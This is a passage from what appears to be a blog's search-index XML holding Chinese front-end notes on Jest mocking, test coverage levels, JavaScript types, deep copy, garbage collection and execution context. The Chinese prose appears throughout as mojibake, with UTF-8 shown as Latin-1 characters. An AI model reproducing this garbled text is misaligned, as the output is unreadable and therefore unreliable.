Mockå‡½æ•°/ç±»ï¼Œåœ¨Javascriptè¯­è¨€ä¸­ï¼Œå‡½æ•°çš„å…¥å‚åŒæ ·ä¹Ÿå¯ä»¥æ˜¯å‡½æ•°(åŒ¿åå‡½æ•°)ï¼Œè¿™æ°å¥½æ˜¯Jsæœ€çµæ´»çš„åœ°æ–¹ï¼Œä½†æ˜¯å¦‚æžœå‚æ•°æ˜¯å‡½æ•°ï¼Œåˆ™ä¼šä½¿å¾—æµ‹è¯•ç”¨ä¾‹çš„ç¼–å†™éš¾åº¦å¤§å¤§æå‡ï¼Œæˆ‘ä»¬å¾ˆéš¾çŸ¥é“å…¥å‚å‡½æ•°çš„è°ƒç”¨æƒ…å†µï¼Œæ‰€ä»¥ï¼Œå¦‚æžœæˆ‘ä»¬å¯ä»¥è·Ÿè¸ªå…¥å‚å‡½æ•°è°ƒç”¨æƒ…å†µï¼Œå°±èƒ½å¾ˆè½»æ¾çš„éªŒè¯å‡½æ•°å¼ç¼–ç¨‹èŒƒå¼ä¸‹çš„ç¨‹åºé€»è¾‘ï¼Œæ°å¥½jestæä¾›äº†ä¸€ä¸ªå‡½æ•°Mockèƒ½åŠ›ï¼Œå¯ä»¥å¸®åŠ©ç”¨æˆ·å¿«é€ŸMockä¸€ä¸ªå¯ä»¥è·Ÿè¸ªå…¶è°ƒç”¨æƒ…å†µçš„åŒ¿åå‡½æ•°ã€‚åŒæ ·ï¼Œå¯¹äºŽç±»ä¹Ÿæ˜¯ï¼Œjestæä¾›äº†mockç±»çš„èƒ½åŠ›ï¼Œå¸®åŠ©ç”¨æˆ·è·Ÿè¸ªä¸€ä¸ªç±»å®žä¾‹çš„ä½¿ç”¨è¿‡ç¨‹ã€‚ ç™½ç›’è¦†ç›– ç™½ç›’è¦†ç›–å°±æ˜¯æµ‹è¯•ç”¨ä¾‹è¦å°½å¯èƒ½çš„è¦†ç›–ç¨‹åºå†…éƒ¨çš„æ‰€æœ‰åˆ†æ”¯è¯­å¥ï¼Œä»Žè€Œæ•´ä½“æ€§çš„ä¿è¯ä»£ç è´¨é‡ã€‚ æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œè¦†ç›–çŽ‡æ˜¯è¡¡é‡å•å…ƒæµ‹è¯•è´¨é‡çš„æ ¸å¿ƒæŒ‡æ ‡ï¼Œä½†æ˜¯ï¼Œå¯¹äºŽTDDè€Œè¨€ï¼Œæˆ‘ä»¬è‚¯å®šä¸å¯èƒ½åšåˆ°ä¸€å¼€å§‹å°±è¾¾åˆ°100%çš„è¦†ç›–çŽ‡ï¼Œæ‰€ä»¥ï¼Œæ­£å¸¸çš„å•å…ƒæµ‹è¯•ç”¨ä¾‹ï¼Œå¾€å¾€æ˜¯å…ˆä»Žé»‘ç›’ç”¨ä¾‹æ¥å†™ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºå¯¹å¤–æš´éœ²çš„APIå±‚é¢çš„æµ‹è¯•ï¼Œå‰æœŸå…ˆå°†è¿™éƒ¨åˆ†çš„å•æµ‹è¦†ç›–å…¨ï¼ŒåŽæœŸï¼Œæˆ‘ä»¬åœ¨bugfixæˆ–è€…feature addtionçš„è¿‡ç¨‹ä¸­å¯ä»¥é€æ­¥å¢žåŠ æµ‹è¯•ç”¨ä¾‹ï¼Œæœ€ç»ˆé€æ­¥è¾¾åˆ°80%ä»¥ä¸Šçš„è¦†ç›–çŽ‡å³å¯æ»¡è¶³ç™½ç›’è¦†ç›–çš„æ•ˆæžœã€‚ å•æµ‹å®šçº§ æ ¹æ®æˆ‘ä»¬å‰é¢æ‰€è¿°çš„ç™½ç›’è¦†ç›–ï¼Œè¦†ç›–çŽ‡æ˜¯ä¸€ä¸ªéžå¸¸å®¢è§‚çš„æŒ‡æ ‡ï¼Œä½†æ˜¯è¦†ç›–çŽ‡å¯¹äºŽå¼€å‘è€…çš„è®¤çŸ¥æ¨¡åž‹è€Œè¨€æ˜¯ä¸å¤Ÿæ¸…æ™°ç»“æž„åŒ–çš„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹è¦†ç›–çŽ‡å†åšä¸€æ¬¡ç»“æž„åŒ–å®šçº§ï¼Œæ–¹ä¾¿å¼€å‘è€…ä¸€æ­¥æ­¥å®Œå–„å•å…ƒæµ‹è¯•ï¼Œä¸‹é¢è®©æˆ‘ä»¬æ¥æžšä¸¾ä¸€ä¸‹æ‰€æœ‰çš„å•æµ‹çº§åˆ«ï¼š Level1ï¼šæ­£å¸¸æµç¨‹å¯ç”¨ï¼Œå³ä¸€ä¸ªå‡½æ•°åœ¨è¾“å…¥æ­£ç¡®çš„å‚æ•°æ—¶ï¼Œä¼šæœ‰æ­£ç¡®çš„è¾“å‡º Level2ï¼šå¼‚å¸¸æµç¨‹å¯æŠ›å‡ºé€»è¾‘å¼‚å¸¸ï¼Œå³è¾“å…¥å‚æ•°æœ‰è¯¯æ—¶ï¼Œä¸èƒ½æŠ›å‡ºç³»ç»Ÿå¼‚å¸¸ï¼Œè€Œæ˜¯ç”¨è‡ªå·±å®šä¹‰çš„é€»è¾‘å¼‚å¸¸é€šçŸ¥ä¸Šå±‚è°ƒç”¨ä»£ç å…¶é”™è¯¯ä¹‹å¤„ Level3ï¼šæžç«¯æƒ…å†µå’Œè¾¹ç•Œæ•°æ®å¯ç”¨ï¼Œå¯¹è¾“å…¥å‚æ•°çš„è¾¹ç•Œæƒ…å†µä¹Ÿè¦å•ç‹¬æµ‹è¯•ï¼Œç¡®ä¿è¾“å‡ºæ˜¯æ­£ç¡®æœ‰æ•ˆçš„ Level4ï¼šæ‰€æœ‰åˆ†æ”¯ã€å¾ªçŽ¯çš„é€»è¾‘èµ°é€šï¼Œä¸èƒ½æœ‰ä»»ä½•æµç¨‹æ˜¯æµ‹è¯•ä¸åˆ°çš„ Level5ï¼šè¾“å‡ºæ•°æ®çš„æ‰€æœ‰å­—æ®µéªŒè¯ï¼Œå¯¹æœ‰å¤æ‚æ•°æ®ç»“æž„çš„è¾“å‡ºï¼Œç¡®ä¿æ¯ä¸ªå­—æ®µéƒ½æ˜¯æ­£ç¡®çš„ ç¤ºä¾‹https://zhuanlan.zhihu.com/p/55887740 https://zhuanlan.zhihu.com/p/55960017]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_JavaScript%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å‰ç«¯é¢è¯•æŒ‡å—_JavaScriptç±»åž‹åŸºæœ¬ç±»åž‹undefined null boolean string String çš„æ„ä¹‰å¹¶éžâ€œå­—ç¬¦ä¸²â€ï¼Œè€Œæ˜¯å­—ç¬¦ä¸²çš„ UTF16ç¼–ç ï¼Œæœ€å¤§é•¿åº¦æ˜¯ 2^53 - 1 number æœ‰18437736874454810627(å³ 2^64-2^53+3)ä¸ªå€¼ 12console.log( 0.1 + 0.2 == 0.3);//false//æµ®ç‚¹è¿ç®—å¸¦æ¥ç²¾åº¦é—®é¢˜console.log( Math.abs(0.1 + 0.2 - 0.3) &lt;= Number.EPSILON);//true//æ£€æŸ¥ç­‰å¼å·¦å³ä¸¤è¾¹å·®çš„ç»å¯¹å€¼æ˜¯å¦å°äºŽæœ€å°ç²¾åº¦ symbol symbolå¼•ç”¨ç±»åž‹object typeofå†…å­˜ç©ºé—´åœ¨å­¦ä¹ å†…å­˜ç©ºé—´ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ä¸‰ç§æ•°æ®ç»“æž„æœ‰ä¸€ä¸ªç›´è§‚çš„è®¤çŸ¥ã€‚ä»–ä»¬åˆ†åˆ«æ˜¯å †(heap)ï¼Œæ ˆ(stack)ä¸Žé˜Ÿåˆ—(queue)ã€‚ å˜é‡å¯¹è±¡ä¸ŽåŸºç¡€æ•°æ®ç±»åž‹JavaScriptçš„æ‰§è¡Œä¸Šä¸‹æ–‡ç”Ÿæˆä¹‹åŽï¼Œä¼šåˆ›å»ºä¸€ä¸ªå«åšå˜é‡å¯¹è±¡çš„ç‰¹æ®Šå¯¹è±¡ï¼ŒJavaScriptçš„åŸºç¡€æ•°æ®ç±»åž‹å¾€å¾€éƒ½ä¼šä¿å­˜åœ¨å˜é‡å¯¹è±¡ä¸­ã€‚ ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´ï¼Œå˜é‡å¯¹è±¡ä¹Ÿæ˜¯å­˜æ”¾äºŽå †å†…å­˜ä¸­ï¼Œä½†æ˜¯ç”±äºŽå˜é‡å¯¹è±¡çš„ç‰¹æ®ŠèŒèƒ½ï¼Œæˆ‘ä»¬åœ¨ç†è§£æ—¶ä»ç„¶éœ€è¦å°†å…¶äºŽå †å†…å­˜åŒºåˆ†å¼€æ¥ã€‚ åŸºç¡€æ•°æ®ç±»åž‹éƒ½æ˜¯ä¸€äº›ç®€å•çš„æ•°æ®æ®µï¼ŒJavaScriptä¸­æœ‰5ç§åŸºç¡€æ•°æ®ç±»åž‹ï¼Œåˆ†åˆ«æ˜¯Undefinedã€Nullã€Booleanã€Numberã€Stringã€Symbolã€‚åŸºç¡€æ•°æ®ç±»åž‹éƒ½æ˜¯æŒ‰å€¼è®¿é—®ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ç›´æŽ¥æ“ä½œä¿å­˜åœ¨å˜é‡ä¸­çš„å®žé™…çš„å€¼ã€‚ å¼•ç”¨æ•°æ®ç±»åž‹ä¸Žå †å†…å­˜ä¸Žå…¶ä»–è¯­è¨€ä¸åŒï¼ŒJSçš„å¼•ç”¨æ•°æ®ç±»åž‹ï¼Œæ¯”å¦‚æ•°ç»„Arrayï¼Œå®ƒä»¬å€¼çš„å¤§å°æ˜¯ä¸å›ºå®šçš„ã€‚å¼•ç”¨æ•°æ®ç±»åž‹çš„å€¼æ˜¯ä¿å­˜åœ¨å †å†…å­˜ä¸­çš„å¯¹è±¡ã€‚JavaScriptä¸å…è®¸ç›´æŽ¥è®¿é—®å †å†…å­˜ä¸­çš„ä½ç½®ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç›´æŽ¥æ“ä½œå¯¹è±¡çš„å †å†…å­˜ç©ºé—´ã€‚åœ¨æ“ä½œå¯¹è±¡æ—¶ï¼Œå®žé™…ä¸Šæ˜¯åœ¨æ“ä½œå¯¹è±¡çš„å¼•ç”¨è€Œä¸æ˜¯å®žé™…çš„å¯¹è±¡ã€‚å› æ­¤ï¼Œå¼•ç”¨ç±»åž‹çš„å€¼éƒ½æ˜¯æŒ‰å¼•ç”¨è®¿é—®çš„ã€‚è¿™é‡Œçš„å¼•ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºä¿å­˜åœ¨å˜é‡å¯¹è±¡ä¸­çš„ä¸€ä¸ªåœ°å€ï¼Œè¯¥åœ°å€ä¸Žå †å†…å­˜çš„å®žé™…å€¼ç›¸å…³è”ã€‚ ä¸ºäº†æ›´å¥½çš„æžæ‡‚å˜é‡å¯¹è±¡ä¸Žå †å†…å­˜ï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆä»¥ä¸‹ä¾‹å­ä¸Žå›¾è§£è¿›è¡Œç†è§£ã€‚ 123456var a1 = 0; // å˜é‡å¯¹è±¡var a2 = 'this is string'; // å˜é‡å¯¹è±¡var a3 = null; // å˜é‡å¯¹è±¡var b = &#123; m: 20 &#125;; // å˜é‡bå­˜åœ¨äºŽå˜é‡å¯¹è±¡ä¸­ï¼Œ&#123;m: 20&#125; ä½œä¸ºå¯¹è±¡å­˜åœ¨äºŽå †å†…å­˜ä¸­var c = [1, 2, 3]; // å˜é‡cå­˜åœ¨äºŽå˜é‡å¯¹è±¡ä¸­ï¼Œ[1, 2, 3] ä½œä¸ºå¯¹è±¡å­˜åœ¨äºŽå †å†…å­˜ä¸­ ä¸Šä¾‹å›¾è§£ å› æ­¤å½“æˆ‘ä»¬è¦è®¿é—®å †å†…å­˜ä¸­çš„å¼•ç”¨æ•°æ®ç±»åž‹æ—¶ï¼Œå®žé™…ä¸Šæˆ‘ä»¬é¦–å…ˆæ˜¯ä»Žå˜é‡å¯¹è±¡ä¸­èŽ·å–äº†è¯¥å¯¹è±¡çš„åœ°å€å¼•ç”¨ï¼ˆæˆ–è€…åœ°å€æŒ‡é’ˆï¼‰ï¼Œç„¶åŽå†ä»Žå †å†…å­˜ä¸­å–å¾—æˆ‘ä»¬éœ€è¦çš„æ•°æ®ã€‚ å¼•ç”¨ç±»åž‹çš„å¤åˆ¶åŒæ ·ä¹Ÿä¼šä¸ºæ–°çš„å˜é‡è‡ªåŠ¨åˆ†é…ä¸€ä¸ªæ–°çš„å€¼ä¿å­˜åœ¨å˜é‡å¯¹è±¡ä¸­ï¼Œä½†ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªæ–°çš„å€¼ï¼Œä»…ä»…åªæ˜¯å¼•ç”¨ç±»åž‹çš„ä¸€ä¸ªåœ°å€æŒ‡é’ˆã€‚å½“åœ°å€æŒ‡é’ˆç›¸åŒæ—¶ï¼Œå°½ç®¡ä»–ä»¬ç›¸äº’ç‹¬ç«‹ï¼Œä½†æ˜¯åœ¨å˜é‡å¯¹è±¡ä¸­è®¿é—®åˆ°çš„å…·ä½“å¯¹è±¡å®žé™…ä¸Šæ˜¯åŒä¸€ä¸ªã€‚ æ·±æµ…å¤åˆ¶æµ…æ‹·è´ æµ…æ‹·è´æ˜¯ä¼šå°†å¯¹è±¡çš„æ¯ä¸ªå±žæ€§è¿›è¡Œä¾æ¬¡å¤åˆ¶ï¼Œä½†æ˜¯å½“å¯¹è±¡çš„å±žæ€§å€¼æ˜¯å¼•ç”¨ç±»åž‹æ—¶ï¼Œå®žè´¨å¤åˆ¶çš„æ˜¯å…¶å¼•ç”¨ï¼Œå½“å¼•ç”¨æŒ‡å‘çš„å€¼æ”¹å˜æ—¶ä¹Ÿä¼šè·Ÿç€å˜åŒ–ã€‚ 123456789101112let obj = &#123; name: &apos;Yvette&apos;, age: 18, hobbies: [&apos;reading&apos;, &apos;photography&apos;]&#125;let obj2 = Object.assign(&#123;&#125;, obj);let obj3 = &#123;...obj&#125;;obj.name = &apos;Jack&apos;;//åŸºæœ¬ç±»åž‹ä¸æ”¹å˜obj.hobbies.push(&apos;coding&apos;);//å¼•ç”¨ç±»åž‹æ”¹å˜console.log(obj);//&#123; name: &apos;Jack&apos;, age: 18,hobbies: [ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos; ] &#125;console.log(obj2);//&#123; name: &apos;Yvette&apos;, age: 18,hobbies: [ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos; ] &#125;console.log(obj3);//&#123; name: &apos;Yvette&apos;, age: 18,hobbies: [ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos; ] &#125; æ·±æ‹·è´ æ·±æ‹·è´å¤åˆ¶å˜é‡å€¼ï¼Œå¯¹äºŽéžåŸºæœ¬ç±»åž‹çš„å˜é‡ï¼Œåˆ™é€’å½’è‡³åŸºæœ¬ç±»åž‹å˜é‡åŽï¼Œå†å¤åˆ¶ã€‚ æ·±æ‹·è´åŽçš„å¯¹è±¡ä¸ŽåŽŸæ¥çš„å¯¹è±¡æ˜¯å®Œå…¨éš”ç¦»çš„ï¼Œäº’ä¸å½±å“ï¼Œå¯¹ä¸€ä¸ªå¯¹è±¡çš„ä¿®æ”¹å¹¶ä¸ä¼šå½±å“å¦ä¸€ä¸ªå¯¹è±¡ã€‚ 1.æ·±æ‹·è´æœ€ç®€å•çš„å®žçŽ°æ˜¯: JSON.parse(JSON.stringify(obj)) JSON.parse(JSON.stringify(obj)) æ˜¯æœ€ç®€å•çš„å®žçŽ°æ–¹å¼ï¼Œä½†æ˜¯æœ‰ä¸€äº›ç¼ºé™·ï¼š å¯¹è±¡çš„å±žæ€§å€¼æ˜¯å‡½æ•°æ—¶ï¼Œæ— æ³•æ‹·è´ã€‚ åŽŸåž‹é“¾ä¸Šçš„å±žæ€§æ— æ³•æ‹·è´ ä¸èƒ½æ­£ç¡®çš„å¤„ç† Date ç±»åž‹çš„æ•°æ® ä¸èƒ½å¤„ç† RegExp ä¼šå¿½ç•¥ symbol ä¼šå¿½ç•¥ undefined 2.å®žçŽ°ä¸€ä¸ª deepClone å‡½æ•° å¦‚æžœæ˜¯åŸºæœ¬æ•°æ®ç±»åž‹ï¼Œç›´æŽ¥è¿”å›ž å¦‚æžœæ˜¯ RegExp æˆ–è€… Date ç±»åž‹ï¼Œè¿”å›žå¯¹åº”ç±»åž‹ å¦‚æžœæ˜¯å¤æ‚æ•°æ®ç±»åž‹ï¼Œé€’å½’ã€‚ è€ƒè™‘å¾ªçŽ¯å¼•ç”¨çš„é—®é¢˜ 1234567891011121314151617181920function deepClone(obj, hash = new WeakMap()) &#123; //é€’å½’æ‹·è´ if (obj instanceof RegExp) return new RegExp(obj); if (obj instanceof Date) return new Date(obj); if (obj === null || typeof obj !== &apos;object&apos;) return obj; //å¦‚æžœä¸æ˜¯å¤æ‚æ•°æ®ç±»åž‹ï¼Œç›´æŽ¥è¿”å›ž if (hash.has(obj)) &#123; return hash.get(obj); &#125; /** * å¦‚æžœobjæ˜¯æ•°ç»„ï¼Œé‚£ä¹ˆ obj.constructor æ˜¯ [Function: Array] * å¦‚æžœobjæ˜¯å¯¹è±¡ï¼Œé‚£ä¹ˆ obj.constructor æ˜¯ [Function: Object] */ let t = new obj.constructor(); hash.set(obj, t); for (let key in obj) &#123; //é€’å½’ if (obj.hasOwnProperty(key)) &#123;//æ˜¯å¦æ˜¯è‡ªèº«çš„å±žæ€§ t[key] = deepClone(obj[key], hash); &#125; &#125; return t;&#125; å†…å­˜ç©ºé—´ç®¡ç†åžƒåœ¾å›žæ”¶æ ‡è®°æ¸…é™¤ è¿™æ˜¯æœ€å¸¸è§çš„åžƒåœ¾å›žæ”¶æ–¹å¼ï¼Œå½“å˜é‡è¿›å…¥çŽ¯å¢ƒæ—¶ï¼Œå°±æ ‡è®°è¿™ä¸ªå˜é‡ä¸ºâ€è¿›å…¥çŽ¯å¢ƒâ€œ,ä»Žé€»è¾‘ä¸Šè®²ï¼Œæ°¸è¿œä¸èƒ½é‡Šæ”¾è¿›å…¥çŽ¯å¢ƒçš„å˜é‡æ‰€å çš„å†…å­˜ï¼Œæ°¸è¿œä¸èƒ½é‡Šæ”¾è¿›å…¥çŽ¯å¢ƒå˜é‡æ‰€å ç”¨çš„å†…å­˜ï¼Œåªè¦æ‰§è¡Œæµç¨‹è¿›å…¥ç›¸åº”çš„çŽ¯å¢ƒï¼Œå°±å¯èƒ½ç”¨åˆ°ä»–ä»¬ã€‚å½“ç¦»å¼€çŽ¯å¢ƒæ—¶ï¼Œå°±æ ‡è®°ä¸ºç¦»å¼€çŽ¯å¢ƒã€‚ åžƒåœ¾å›žæ”¶å™¨åœ¨è¿è¡Œçš„æ—¶å€™ä¼šç»™å­˜å‚¨åœ¨å†…å­˜ä¸­çš„å˜é‡éƒ½åŠ ä¸Šæ ‡è®°ï¼ˆæ‰€æœ‰éƒ½åŠ ï¼‰ï¼Œç„¶åŽåŽ»æŽ‰çŽ¯å¢ƒå˜é‡ä¸­çš„å˜é‡ï¼Œä»¥åŠè¢«çŽ¯å¢ƒå˜é‡ä¸­çš„å˜é‡æ‰€å¼•ç”¨çš„å˜é‡ï¼ˆæ¡ä»¶æ€§åŽ»é™¤æ ‡è®°ï¼‰ï¼Œåˆ é™¤æ‰€æœ‰è¢«æ ‡è®°çš„å˜é‡ï¼Œåˆ é™¤çš„å˜é‡æ— æ³•åœ¨çŽ¯å¢ƒå˜é‡ä¸­è¢«è®¿é—®æ‰€ä»¥ä¼šè¢«åˆ é™¤ï¼Œæœ€åŽåžƒåœ¾å›žæ”¶å™¨ï¼Œå®Œæˆäº†å†…å­˜çš„æ¸…é™¤å·¥ä½œï¼Œå¹¶å›žæ”¶ä»–ä»¬æ‰€å ç”¨çš„å†…å­˜ã€‚ å¼•ç”¨è®¡æ•°æ³• å¦ä¸€ç§ä¸å¤ªå¸¸è§çš„æ–¹æ³•å°±æ˜¯å¼•ç”¨è®¡æ•°æ³•ï¼Œå¼•ç”¨è®¡æ•°æ³•çš„æ„æ€å°±æ˜¯æ¯ä¸ªå€¼æ²¡å¼•ç”¨çš„æ¬¡æ•°ï¼Œå½“å£°æ˜Žäº†ä¸€ä¸ªå˜é‡ï¼Œå¹¶ç”¨ä¸€ä¸ªå¼•ç”¨ç±»åž‹çš„å€¼èµ‹å€¼ç»™æ”¹å˜é‡ï¼Œåˆ™è¿™ä¸ªå€¼çš„å¼•ç”¨æ¬¡æ•°ä¸º1,ï¼›ç›¸åçš„ï¼Œå¦‚æžœåŒ…å«äº†å¯¹è¿™ä¸ªå€¼å¼•ç”¨çš„å˜é‡åˆå–å¾—äº†å¦å¤–ä¸€ä¸ªå€¼ï¼Œåˆ™åŽŸå…ˆçš„å¼•ç”¨å€¼å¼•ç”¨æ¬¡æ•°å°±å‡1ï¼Œå½“è¿™ä¸ªå€¼çš„å¼•ç”¨æ¬¡æ•°ä¸º0çš„æ—¶å€™ï¼Œè¯´æ˜Žæ²¡æœ‰åŠžæ³•å†è®¿é—®è¿™ä¸ªå€¼äº†ï¼Œå› æ­¤å°±æŠŠæ‰€å çš„å†…å­˜ç»™å›žæ”¶è¿›æ¥ï¼Œè¿™æ ·åžƒåœ¾æ”¶é›†å™¨å†æ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šé‡Šæ”¾å¼•ç”¨æ¬¡æ•°ä¸º0çš„è¿™äº›å€¼ã€‚ ç”¨å¼•ç”¨è®¡æ•°æ³•ä¼šå­˜åœ¨å†…å­˜æ³„éœ²ï¼Œä¸‹é¢æ¥çœ‹åŽŸå› ï¼š 123456function problem() &#123; var objA = new Object(); var objB = new Object(); objA.someOtherObject = objB; objB.anotherObject = objA;&#125; åœ¨è¿™ä¸ªä¾‹å­é‡Œé¢ï¼ŒobjAå’ŒobjBé€šè¿‡å„è‡ªçš„å±žæ€§ç›¸äº’å¼•ç”¨ï¼Œè¿™æ ·çš„è¯ï¼Œä¸¤ä¸ªå¯¹è±¡çš„å¼•ç”¨æ¬¡æ•°éƒ½ä¸º2ï¼Œåœ¨é‡‡ç”¨å¼•ç”¨è®¡æ•°çš„ç­–ç•¥ä¸­ï¼Œç”±äºŽå‡½æ•°æ‰§è¡Œä¹‹åŽï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡éƒ½ç¦»å¼€äº†ä½œç”¨åŸŸï¼Œå‡½æ•°æ‰§è¡Œå®Œæˆä¹‹åŽï¼Œå› ä¸ºè®¡æ•°ä¸ä¸º0ï¼Œè¿™æ ·çš„ç›¸äº’å¼•ç”¨å¦‚æžœå¤§é‡å­˜åœ¨å°±ä¼šå¯¼è‡´å†…å­˜æ³„éœ²ã€‚ æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆexecute contextï¼ŒECï¼‰æ¯æ¬¡å½“æŽ§åˆ¶å™¨è½¬åˆ°å¯æ‰§è¡Œä»£ç çš„æ—¶å€™ï¼Œå°±ä¼šè¿›å…¥ä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ã€‚æ‰§è¡Œä¸Šä¸‹æ–‡æŒ‡ä»£ç æ­£å¼æ‰§è¡Œä¹‹å‰è¿›å…¥çš„æ‰§è¡ŒçŽ¯å¢ƒï¼Œå®ƒä¼šå½¢æˆä¸€ä¸ªä½œç”¨åŸŸã€‚JavaScriptä¸­çš„è¿è¡ŒçŽ¯å¢ƒå¤§æ¦‚åŒ…æ‹¬ä¸‰ç§æƒ…å†µã€‚ å…¨å±€çŽ¯å¢ƒï¼šJavaScriptä»£ç è¿è¡Œèµ·æ¥ä¼šé¦–å…ˆè¿›å…¥è¯¥çŽ¯å¢ƒ å‡½æ•°çŽ¯å¢ƒï¼šå½“å‡½æ•°è¢«è°ƒç”¨æ‰§è¡Œæ—¶ï¼Œä¼šè¿›å…¥å½“å‰å‡½æ•°ä¸­æ‰§è¡Œä»£ç  evalï¼ˆä¸å»ºè®®ä½¿ç”¨ï¼Œå¯å¿½ç•¥ï¼‰ å› æ­¤åœ¨ä¸€ä¸ªJavaScriptç¨‹åºä¸­ï¼Œå¿…å®šä¼šäº§ç”Ÿå¤šä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œåœ¨æˆ‘çš„ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ä¹Ÿæœ‰æåˆ°ï¼ŒJavaScriptå¼•æ“Žä¼šä»¥æ ˆçš„æ–¹å¼æ¥å¤„ç†å®ƒä»¬ï¼Œè¿™ä¸ªæ ˆï¼Œæˆ‘ä»¬ç§°å…¶ä¸ºå‡½æ•°è°ƒç”¨æ ˆ(call stack)ã€‚æ ˆåº•æ°¸è¿œéƒ½æ˜¯å…¨å±€ä¸Šä¸‹æ–‡ï¼Œè€Œæ ˆé¡¶å°±æ˜¯å½“å‰æ­£åœ¨æ‰§è¡Œçš„ä¸Šä¸‹æ–‡ã€‚ å½“ä»£ç åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œé‡åˆ°ä»¥ä¸Šä¸‰ç§æƒ…å†µï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œæ”¾å…¥æ ˆä¸­ï¼Œè€Œå¤„äºŽæ ˆé¡¶çš„ä¸Šä¸‹æ–‡æ‰§è¡Œå®Œæ¯•ä¹‹åŽï¼Œå°±ä¼šè‡ªåŠ¨å‡ºæ ˆã€‚å…¨å±€ä¸Šä¸‹æ–‡åœ¨æµè§ˆå™¨çª—å£å…³é—­åŽå‡ºæ ˆã€‚ åˆ›å»ºæµç¨‹ï¼š 1.åˆ›å»ºå˜é‡å¯¹è±¡ï¼ˆå˜é‡æå‡ï¼‰ 1ï¼‰å˜é‡ 2ï¼‰å‡½æ•°åŠå‡½æ•°å‚æ•° 2.ç¡®è®¤thisæŒ‡å‘ï¼ˆVO-&gt;AOï¼‰ 1ï¼‰å…¨å±€ this-&gt;window 2ï¼‰å±€éƒ¨ æŒ‡å‘è°ƒç”¨å®ƒçš„å¯¹è±¡ 3.åˆ›å»ºä½œç”¨åŸŸé“¾ çˆ¶çº§ä½œç”¨åŸŸé“¾+å½“å‰å˜é‡å¯¹è±¡ æ‰§è¡Œæµç¨‹ï¼š å˜é‡èµ‹å€¼ å‡½æ•°å¼•ç”¨ æ‰§è¡Œä»£ç  å‡ºæ ˆ JSæ‰§è¡Œä¸Šä¸‹æ–‡æ ˆç®€ç§°æ‰§è¡Œæ ˆï¼Œä¹Ÿå«åšè°ƒç”¨æ ˆï¼Œå…·æœ‰ LIFO (åŽè¿›å…ˆå‡º) ç»“æž„ï¼Œç”¨äºŽå­˜å‚¨åœ¨ä»£ç æ‰§è¡ŒæœŸé—´åˆ›å»ºçš„æ‰€æœ‰æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ è§„åˆ™å¦‚ä¸‹ï¼š é¦–æ¬¡è¿è¡ŒJavaScriptä»£ç çš„æ—¶å€™,ä¼šåˆ›å»ºä¸€ä¸ªå…¨å±€æ‰§è¡Œçš„ä¸Šä¸‹æ–‡å¹¶Pushåˆ°å½“å‰çš„æ‰§è¡Œæ ˆä¸­ï¼Œæ¯å½“å‘ç”Ÿå‡½æ•°è°ƒç”¨ï¼Œå¼•æ“Žéƒ½ä¼šä¸ºè¯¥å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡å¹¶Pushå½“å‰æ‰§è¡Œæ ˆçš„æ ˆé¡¶ã€‚ å½“æ ˆé¡¶çš„å‡½æ•°è¿è¡Œå®ŒæˆåŽï¼Œå…¶å¯¹åº”çš„å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡å°†ä¼šä»Žæ‰§è¡Œæ ˆä¸­Popå‡ºï¼Œä¸Šä¸‹æ–‡çš„æŽ§åˆ¶æƒå°†ç§»åŠ¨åˆ°å½“å‰æ‰§è¡Œæ ˆçš„ä¸‹ä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ ä½œç”¨åŸŸä½œç”¨åŸŸæ˜¯å˜é‡ä»¥åŠé€šè¿‡åç§°è®¿é—®è¿™äº›å˜é‡çš„è§„åˆ™çš„é›†åˆ å˜é‡æå‡å˜é‡åªæå‡å£°æ˜Ž let å¯¼è‡´ TDZ å‡½æ•°æ•´ä½“æå‡ ä½œç”¨åŸŸé“¾ä½œç”¨åŸŸé“¾å°±æ˜¯ä»Žå½“å‰ä½œç”¨åŸŸå¼€å§‹ä¸€å±‚ä¸€å±‚å‘ä¸Šå¯»æ‰¾æŸä¸ªå˜é‡ï¼Œç›´åˆ°æ‰¾åˆ°å…¨å±€ä½œç”¨åŸŸè¿˜æ˜¯æ²¡æ‰¾åˆ°ï¼Œå°±å®£å¸ƒæ”¾å¼ƒã€‚è¿™ç§ä¸€å±‚ä¸€å±‚çš„å…³ç³»ï¼Œå°±æ˜¯ä½œç”¨åŸŸé“¾ã€‚ ä½œç”¨åŸŸé“¾ï¼Œæ˜¯ç”±å½“å‰çŽ¯å¢ƒä¸Žä¸Šå±‚çŽ¯å¢ƒçš„ä¸€ç³»åˆ—å˜é‡å¯¹è±¡ç»„æˆï¼Œå®ƒä¿è¯äº†å½“å‰æ‰§è¡ŒçŽ¯å¢ƒå¯¹ç¬¦åˆè®¿é—®æƒé™çš„å˜é‡å’Œå‡½æ•°çš„æœ‰åºè®¿é—®ã€‚ å˜é‡å¯¹è±¡ï¼ˆVariable 